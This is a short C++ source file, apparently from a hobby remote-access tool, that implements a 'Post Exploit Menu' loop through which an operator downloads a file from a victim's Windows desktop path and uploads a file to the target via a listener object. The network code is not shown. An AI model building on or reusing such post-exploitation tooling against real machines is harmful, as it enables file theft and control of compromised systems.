#include "menus.h"
#include <iostream>
#include <stdio.h> 
#include <unistd.h> 
#include <string>
#include <cstring>
#include "listener.h"

using namespace std;

void postExploitMenu(listener *newL) {
	printf("<---This is the Post Exploit Menu--->\n");

	string cmd;
	while(true){
		cout<<"ShellNo:Listener->";
		getline(cin,cmd);
		if(!cmd.compare("download")){
			printf("You Selected Download\n");
			newL->downloadFile("C:\\\\Users\\\\john\\\\Desktop\\\\download.txt", "download.txt");
		}
		if(!cmd.compare("upload")){
			printf("You Selected Upload\n");
			newL->uploadFile("upload.txt", "C:\\\\test\\\\upload.txt");
		}
		if(!cmd.compare("exit")){
			printf("Exiting!\n");
			break;
		}
	}
}

